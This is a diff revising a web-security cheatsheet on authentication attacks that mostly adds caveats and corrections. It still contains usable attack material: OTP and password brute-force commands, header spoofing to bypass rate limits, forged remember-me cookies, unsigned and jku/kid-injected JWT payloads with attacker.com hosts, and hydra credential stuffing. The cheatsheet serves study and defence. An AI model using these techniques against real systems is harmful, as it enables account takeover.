@@ -1,11 +1,11 @@
-# Authentication — Complete Cheatsheet
-> OWASP Top 10 2025: A07 — Identification and Authentication Failures
+# Authentication —  Cheatsheet
+> OWASP Top 10:2025 — A07: Authentication Failures
 
 ---
 
 ## 1. What is Authentication?
 
-Authentication is the process of **verifying a user's identity** — confirming that you are who you claim to be. It is the first line of defence for any web application. A flawed authentication mechanism can allow attackers to:
+Authentication is the process of **verifying a user's identity** — confirming that you are who you claim to be. It is a core security control for any web application. A flawed authentication mechanism can allow attackers to:
 
 - Bypass login entirely
 - Access another user's account
@@ -26,14 +26,16 @@ Attacker Input  →  Login Endpoint  →  Session Issued
 |---|---|---|
 | Username enumeration | Response/timing differences on login | Medium |
 | No rate limiting | Brute force passwords | High |
-| Weak password reset token | Predictable/leaked token | Critical |
-| MFA bypass | URL jump, OTP brute force | Critical |
-| Insecure remember-me cookie | Base64/predictable value forgery | High |
-| Session fixation | Pre-set session ID | High |
-| JWT none/alg confusion | Token forgery | Critical |
-| Credential stuffing | Leaked credential reuse | High |
-| Host header injection (reset) | Password reset link hijack | Critical |
-| Insecure session cookie | No HttpOnly/Secure flags | Medium |
+| Weak password reset token | Predictable/leaked token | High/Critical* |
+| MFA bypass | Missing MFA enforcement / OTP attacks | High/Critical* |
+| Insecure remember-me cookie | Predictable or forgeable token | High/Critical* |
+| Session fixation | Session ID not regenerated | High |
+| JWT none/alg confusion | Token forgery if verifier is vulnerable | High/Critical* |
+| Credential stuffing | Reuse of compromised credentials | High |
+| Password-reset host-header poisoning | Untrusted host used in reset-link generation | High/Critical* |
+| Insecure session cookie | Missing/incorrect security attributes | Medium/High |
+
+> **Severity is context-dependent.** The labels above are study-note guidance, not universal CVSS ratings.
 
 ---
 
@@ -52,8 +54,9 @@ Response: "Username does not exist"      ← user NOT FOUND
 ### Via Timing Differences
 
 ```python
-# Valid username takes longer to respond (bcrypt comparison performed)
-# Invalid username fails fast (no DB record found)
+# A timing difference may exist when valid and invalid usernames follow
+# different server-side code paths (for example, password-hash verification).
+# Do not assume valid usernames always take longer; measure statistically.
 
 import requests, time
 for user in wordlist:
@@ -132,12 +135,14 @@ Filter: 302 redirect / different length
 ## 5. Rate Limiting Bypass
 
 ```http
-# Rotate IP via header spoofing (Burp Intruder — Pitchfork)
+# Only relevant if the application/proxy incorrectly trusts
+# attacker-controlled client-IP headers.
 X-Forwarded-For: §1.1.1.1§
 X-Real-IP: §1.1.1.1§
 X-Originating-IP: §1.1.1.1§
 
-# Payload list: 1.1.1.1, 1.1.1.2, 1.1.1.3 ... (paired with passwords)
+# Test whether changing a trusted header changes the rate-limit key.
+# Do not assume these headers are trusted or effective on every target.
 ```
 
 ```python
@@ -159,13 +164,16 @@ Cookie: remember_me=dXNlcjoxMjM=
 echo "dXNlcjoxMjM=" | base64 -d
 # Output: user:123
 
-# Step 3: Forge for target user (e.g., admin = user:1)
+# Step 3: If the application unsafely trusts the decoded user identifier,
+# test whether changing it affects the authenticated identity.
 echo -n "user:1" | base64
 # Output: dXNlcjox
 
 # Step 4: Replace cookie
 Cookie: remember_me=dXNlcjox
-# Result: Logged in as user ID 1
+
+# Result depends on the target implementation; Base64 encoding alone
+# does not make a remember-me token forgeable.
 ```
 
 ---
@@ -180,7 +188,8 @@ Cookie: remember_me=dXNlcjox
 
 # Check token:
 # - Is it time-based? (UNIX timestamp in hex/base64)
-# - Is it short? (<32 chars → brute forceable)
+# - Is it short or otherwise low-entropy? (length alone does not prove
+#   brute-forceability; entropy and server-side validation matter)
 # - Does it expire after use?
 
 # Brute force (if short)
@@ -199,16 +208,19 @@ email=victim@target.com
 
 # Server may generate:
 # https://attacker.com/reset?token=abc123
-# Victim clicks → token received by attacker
+# This is exploitable only if the application trusts attacker-controlled
+# Host/forwarded-host information when constructing the reset URL.
 ```
 
 ### Referer Header Leakage
 
 ```
 # Reset page loads third-party resources (analytics, fonts)
-# Browser sends Referer header to those resources
+# Depending on browser policy and application configuration, the URL may be
+# sent as a Referer to a third-party resource.
 Referer: https://target.com/reset?token=abc123
-# Token exposed to analytics endpoint
+# Avoid loading third-party resources on sensitive reset pages and use an
+# appropriate Referrer-Policy.
 ```
 
 ---
@@ -229,7 +241,7 @@ GET /dashboard
 ### OTP Brute Force
 
 ```bash
-# 4-digit: 10,000 combos
+# 4-digit numeric OTP: 10,000 possible combinations (if all values are valid)
 ffuf -u https://target.com/mfa \
   -X POST \
   -d "otp=FUZZ" \
@@ -254,9 +266,10 @@ ffuf -u https://target.com/recovery \
 ### TOTP Secret Recovery
 
 ```python
-# If TOTP QR code URL is accessible
+# A TOTP provisioning URI/QR code may contain the shared secret:
 # otpauth://totp/...?secret=BASE32SECRET
-# Generate valid OTP:
+
+# If that secret is improperly exposed, it can be used to generate codes:
 import pyotp
 print(pyotp.TOTP('BASE32SECRET').now())
 ```
@@ -268,9 +281,11 @@ print(pyotp.TOTP('BASE32SECRET').now())
 ### Decode a JWT
 
 ```bash
-# JWT = header.payload.signature (base64url encoded)
+# JWT = header.payload.signature
+# Header and payload are Base64URL-encoded JSON; the signature is not simply
+# "decoded" because it is cryptographic data.
 echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
-# {"alg":"HS256"}
+# {"alg":"HS256"}  # illustrative only; GNU/Linux base64 may need URL-safe decoding
 
 # Use jwt.io or jwt_tool
 python3 jwt_tool.py <token>
@@ -279,11 +294,13 @@ python3 jwt_tool.py <token>
 ### None Algorithm Attack
 
 ```json
-// Change header:
+// Vulnerable verifier case: attacker changes header:
 {"alg": "none"}
 
-// Remove signature (keep trailing dot):
+// Remove the signature (keep the final dot):
 eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+// Exploitable only when the verifier incorrectly accepts unsigned tokens.
 ```
 
 ### RS256 → HS256 Algorithm Confusion
@@ -304,21 +321,26 @@ hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
 ### jwks / jku Header Injection
 
 ```json
-// Change header to point to attacker-controlled JWKS:
+// In a vulnerable verifier, point jku to an attacker-controlled JWKS:
 {
   "alg": "RS256",
   "jku": "https://attacker.com/jwks.json"
 }
-// Server fetches attacker's public key → verifies attacker-signed token
+// Exploitable only if the verifier improperly trusts unapproved remote keys.
 ```
 
-### kid Header Path Traversal / SQL Injection
+### kid Header Injection
 
 ```json
-// kid → key identifier used to look up signing key
-{"kid": "../../dev/null"}    // null-byte key → sign with empty string
-{"kid": "' UNION SELECT 'attacker_key' --"}  // SQLi in kid lookup
+// kid is a key identifier used by the verifier to select a signing key.
+// Vulnerabilities depend on how the application resolves the identifier.
+
+// Example test cases in a vulnerable local/lab implementation:
+{"kid": "../../dev/null"}
+{"kid": "' UNION SELECT 'attacker_key' --"}
 ```
+
+> `kid` path traversal or SQL injection is **not inherent to JWT**; it results from unsafe key lookup logic.
 
 ---
 
@@ -356,17 +378,21 @@ hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
 # Sequencer collects and analyses token randomness
 
 # Manually check:
-# Short IDs, sequential IDs, base64 of username+timestamp = weak
+# Predictable/sequential IDs or deterministic encodings such as username+timestamp = weak
 ```
 
 ---
 
 ## 11. OAuth / SSO Attacks
 
+> **Terminology:** OAuth 2.0 is primarily an authorization framework. OpenID Connect (OIDC) adds an identity layer for authentication. SSO may be implemented with OIDC, SAML, or other federation technologies.
+
+
 ### Missing State Parameter (CSRF)
 
 ```
-# OAuth CSRF → link victim's account to attacker's OAuth identity
+# Depending on the vulnerable flow, OAuth CSRF can cause the victim's session
+# to be linked to an attacker's OAuth identity.
 # Step 1: Start OAuth flow as attacker, capture authorization URL
 # Step 2: Before completing, send URL to victim (without state)
 # Step 3: Victim clicks → account linked to attacker's identity
@@ -377,19 +403,22 @@ hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
 ```
 # Registered: https://app.com/callback
 
-# Try bypasses:
+# Candidate validation tests:
 https://app.com.attacker.com/callback
 https://app.com/callback%40attacker.com
 https://app.com/callback/../leak
 https://app.com/callback?redirect=https://attacker.com
+
+# Whether any variant bypasses validation depends on the exact URI parser
+# and redirect_uri validation rules.
 ```
 
 ### Leaking Code via Referer
 
 ```
-# If callback page loads third-party resources:
-GET /callback?code=AUTH_CODE
-Referer header sent → code leaked to analytics/fonts
+# If the callback page loads third-party resources, the authorization code
+# may be exposed through the Referer header depending on referrer policy and
+# browser behavior.
 ```
 
 ---
@@ -397,8 +426,12 @@ Referer header sent → code leaked to analytics/fonts
 ## 12. Credential Stuffing
 
 ```bash
-# Use breach datasets (HaveIBeenPwned, Dehashed)
-# Format: username:password per line
+# Use lawfully obtained/test credential pairs or breach-derived datasets
+# where their use is authorized and appropriate.
+#
+# Have I Been Pwned is primarily a breach-exposure checking service; do not
+# describe it as a source of downloadable username:password dumps.
+# DeHashed and similar services have their own access, legal, and usage terms.
 
 hydra -C creds.txt target.com \
   http-post-form "/login:username=^USER^&password=^PASS^:Failed"
@@ -411,7 +444,7 @@ hydra -C creds.txt target.com \
 
 ---
 
-## 13. Hash Cracking
+## 13. Password Hash Cracking
 
 ```bash
 # Identify hash type
@@ -421,7 +454,7 @@ hash-identifier
 # Hashcat modes
 hashcat -m 0    hash.txt wordlist  # MD5
 hashcat -m 100  hash.txt wordlist  # SHA-1
-hashcat -m 1400 hash.txt wordlist  # SHA-256
+hashcat -m 1400 hash.txt wordlist  # SHA-256 (fast hash; not suitable for password storage)
 hashcat -m 1800 hash.txt wordlist  # sha512crypt
 hashcat -m 3200 hash.txt wordlist  # bcrypt
 hashcat -m 16500 token.jwt wordlist # JWT HS256
@@ -486,16 +519,16 @@ JWT
 
 | Control | Implementation |
 |---|---|
-| Rate limiting | Max 5 failed attempts → lockout or CAPTCHA |
-| Password hashing | bcrypt / argon2id (cost factor ≥ 12) |
-| Password reset | 128-bit random token, single-use, 15-min expiry |
-| MFA | TOTP preferred over SMS; validate at every step |
-| Session cookie | `HttpOnly; Secure; SameSite=Strict` |
-| Session lifecycle | Regenerate on login, invalidate on logout |
-| JWT | Pin algorithm server-side; reject `alg: none` |
-| Username enumeration | Uniform messages + uniform response timing |
-| Credential stuffing | Check against breach databases (HIBP API) |
-| Host header | Validate against allowlist; never use user input |
+| Rate limiting | Rate-limit failed authentication and detect automation; avoid account-lockout DoS |
+| Password hashing | Prefer Argon2id; use algorithm-specific, tuned parameters |
+| Password reset | High-entropy random token, single-use, appropriate short expiry |
+| MFA | Prefer phishing-resistant MFA; prefer TOTP over SMS when necessary; validate every step |
+| Session cookie | `HttpOnly; Secure; SameSite=Lax/Strict` as appropriate |
+| Session lifecycle | Regenerate on login, invalidate on logout and expiry |
+| JWT | Pin algorithms; validate issuer/audience/signature and key trust |
+| Username enumeration | Generic responses and reduce observable differences |
+| Credential stuffing | Check passwords against known-breach data via an appropriate service/API |
+| Host header | Generate absolute URLs from trusted configuration; validate forwarded-host handling |
 
 ---
 
@@ -506,17 +539,17 @@ JWT
 | Username enumeration via different responses | Intruder → Sniper → message diff |
 | Username enumeration via subtly different responses | Intruder → grep for subtle word diff |
 | Username enumeration via response timing | Intruder + timing analysis |
-| Password brute-force via account lockout | Cluster Bomb + rotate IP |
-| Broken brute-force protection (IP block) | X-Forwarded-For header rotation |
+| Password brute-force via account lockout | Test lockout/rate-limit behavior |
+| Broken brute-force protection (IP block) | Test whether trusted proxy headers alter the rate-limit key |
 | Broken brute-force protection (multiple creds) | JSON array of passwords in one request |
 | 2FA simple bypass | Jump to /my-account after step 1 |
 | 2FA broken logic | Manipulate `verify` cookie to victim username |
 | 2FA OTP brute force | Intruder → Numbers 0000–9999 |
 | Offline password cracking | Steal "stay-logged-in" cookie → crack MD5 |
 | Password reset broken logic | Modify token + username in reset request |
-| Password reset via dangling markup | Host header → link sent to attacker |
+| Password reset poisoning / host-header issues | Test whether trusted host/forwarded-host configuration can be abused |
 | Password brute-force via password change | Change password with wrong current → enumeration |
 
 ---
 
-*Reference: OWASP Top 10 2025 A07 | PortSwigger Authentication Labs | HackTricks Login Bypass | jwt.io*
+*Reference: OWASP Top 10:2025 A07 — Authentication Failures | OWASP Authentication Cheat Sheet | OWASP Password Storage Cheat Sheet | OWASP Session Management Cheat Sheet | PortSwigger Web Security Academy — Authentication | OAuth | JWT | HackTricks Authentication | jwt.io*
